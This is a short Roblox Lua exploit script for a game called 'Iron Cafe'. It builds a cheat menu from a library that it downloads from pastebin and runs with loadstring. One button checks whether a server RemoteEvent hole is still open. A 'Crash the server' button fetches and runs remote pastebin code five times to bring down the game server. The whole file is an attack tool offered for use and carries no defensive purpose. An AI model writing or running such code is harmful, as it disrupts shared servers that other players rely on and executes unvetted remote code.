--Made by Roblox Thot

local library = loadstring(game:HttpGet('https://pastebin.com/raw/8QmG7aXY'))()
local window = library:AddWindow({title = 'Iron Cafe';desc = 'Press the "P" key to toggle'})
shared.opts.rgb = true;
--tester
window:AddButton("Test if patched",function()
  game:GetService("Workspace").CookingStuff.Milkshakes.CookingGui.RemoteEvent:FireServer(game:GetService("Lighting").FoodTools.Milkshakes.VanillaSmall, "Small", "Vanilla")
end)
--spacer
window:AddButton("",function()
   --spacer :)
end)
--crasher
window:AddButton("Crash the server",function()
   loadstring(game:HttpGet("https://pastebin.com/raw/y6WEH3pJ", true))()
   loadstring(game:HttpGet("https://pastebin.com/raw/y6WEH3pJ", true))()
   loadstring(game:HttpGet("https://pastebin.com/raw/y6WEH3pJ", true))()
   loadstring(game:HttpGet("https://pastebin.com/raw/y6WEH3pJ", true))()
   loadstring(game:HttpGet("https://pastebin.com/raw/y6WEH3pJ", true))()
end)